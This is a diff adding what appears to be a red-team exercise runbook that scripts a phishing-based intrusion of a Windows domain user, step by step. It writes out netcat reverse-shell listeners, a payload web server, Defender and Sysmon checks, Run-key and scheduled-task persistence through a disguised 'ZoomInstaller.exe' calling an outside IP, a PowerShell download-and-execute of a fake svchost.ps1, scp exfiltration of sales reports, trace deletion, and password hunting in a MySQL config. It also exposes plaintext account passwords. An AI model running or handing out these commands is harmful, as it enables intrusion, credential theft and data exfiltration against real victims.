@@ -1,0 +1,84 @@
+Missing:
+- Outlook for Timothy Turner
+- Mapped Share
+
+
+Level #1 Steps:
+-----------------------------------------------------------------------------------------
+0. Login into Kali VM (pass: Extinct^Quote4^Ruby)
+	a. ssh -o 'IdentitiesOnly=yes' delta@191.232.179.179
+1. Make sure SSH server is up and running on attacker host, configured for public key authentication
+2. Open a terminal window
+3. Clone C3X2021Engineering repo
+4. Run a Python HTTP web server hosting payloads in L1/WebShare of C3X2021Engineering repo
+	a. python3 -m http.server --bind 10.0.1.4 8080
+5. Open tabs and start two nc shells
+	a. nc -nlvp 45252
+	b. nc -nlvp 45253
+------------------------------------------------------------------------------------------
+6. Login into Window 10 VM (as domain user Timothy Turner) - pass: Cha0sisaladder
+7. Open Google Chrome and check Outlook email
+8. Find malicious recruitment phish - go to google drive link - and download zip file inside.
+9. Unzip the file in Downloads.
+10. Open the PDF
+11. Open the Excel sheet and disable all protections.
+12. Click Yes to all prompts.
+13. Close all Windows
+-------------------------------------------------------------------------------------------
+14. You should've received shell on port 4444
+15. Execute the following commands:
+
+systeminfo | findstr "[HDO][oS]" 2>&1
+
+whoami /all 2>&1
+
+ipconfig /all 2>&1
+
+route PRINT 2>&1
+
+net user 2>&1
+
+C:\Windows\Sysnative\nltest.exe /dclist:c3xdcr.local 2>&1
+
+sc query WinDefend 2>&1
+
+sc query Sysmon 2>&1
+
+sc query Sysmon64 2>&1
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Zoom /t REG_SZ /d "%APPDATA%\ZoomInstaller.exe 191.232.179.179 45252 -e \"%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -noprofile -windowstyle hidden\"" 2>&1
+-------------------------------------------------------------------------------------------
+16. Restart the Windows 10 VM and login in as tturner
+-------------------------------------------------------------------------------------------
+17. You should've gotten a Powershell Prompt on 45252.
+18. Execute the following commands:
+
+iwr "http://191.232.179.179:8080/svchost.ps1" -o $env:APPDATA\svchost.ps1
+
+. $env:APPDATA\svchost.ps1
+
+tar.exe -cf $env:APPDATA\sales_reports.zip $env:APPDATA\sales_reports.txt
+
+ssh-keygen.exe --% -q -t rsa -b 4096 -N "" -f C:\Users\Public\x1y2z3
+
+cat C:\Users\Public\x1y2z3.pub
+
+scp.exe -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -i C:\Users\Public\x1y2z3 $env:APPDATA\sales_reports.zip delta@191.232.179.179:/home/delta/ 2>&1
+
+rm C:\Users\Public\x1y2z3 -Force
+
+rm C:\Users\Public\x1y2z3.pub -Force
+
+rm $env:APPDATA\sales_reports.zip 
+
+rm $env:APPDATA\sales_reports.txt
+
+rm $env:APPDATA\svchost.ps1
+
+gc 'C:\Program Files\MySQL\MySQL Server 5.5\my.ini' | sls "password" ### STOP
+
+Start-Process -Cred $(New-Object System.Management.Automation.PSCredential ('C3XDCR\helpdesk-admin', $(ConvertTo-SecureString "Cha0sisaladder" -AsPlainText -Force))) -FilePath C:\Windows\System32\schtasks.exe -ArgumentList "/Create /RU C3XDCR\helpdesk-admin /RP Cha0sisaladder /TN Backups /SC MINUTE /MO 5 /TR `"C:\Users\tturner\AppData\Roaming\ZoomInstaller.exe 191.232.179.179 45253 -e \`"$Env:SystemRoot\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -noprofile -windowstyle hidden\`"`"" -WorkingDir C:\Windows\System32
+
+19. You should've gotten a Powershell Prompt on 45253.
+--------------------------------------------------------------------------------------------
+
